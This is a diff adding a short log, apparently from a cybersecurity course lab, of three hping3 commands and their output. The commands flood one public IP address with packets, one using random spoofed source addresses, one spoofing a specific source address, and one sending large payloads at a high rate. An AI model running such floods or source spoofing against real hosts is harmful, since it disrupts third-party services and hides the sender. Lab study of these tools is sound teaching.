@@ -1,0 +1,22 @@
+1)hping3 -c 10000 --rand-source 178.128.237.247
+root@comp3134w21Cyber:~# hping3 -c 10000 --rand-source 178.128.237.247
+HPING 178.128.237.247 (eth0 178.128.237.247): NO FLAGS are set, 40 headers + 0 data bytes
+^C
+--- 178.128.237.247 hping statistic ---
+192 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+2)hping3 -2 -c 9000 -S 178.128.237.247 -a 198.96.86.202
+root@comp3134w21Cyber:~# hping3 -2 -c 9000 -S 178.128.237.247 -a 198.96.86.202
+HPING 178.128.237.247 (eth0 178.128.237.247): udp mode set, 28 headers + 0 data bytes
+^C
+--- 178.128.237.247 hping statistic ---
+8 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+3)hping3 -c 11000 -d 1000 -i u13333 178.128.237.247
+root@comp3134w21Cyber:~# hping3 -c 11000 -d 1000 -i u13333 178.128.237.247      HPING 178.128.237.247 (eth0 178.128.237.247): NO FLAGS are set, 40 headers + 1000 data bytes
+
+--- 178.128.237.247 hping statistic ---
+11000 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
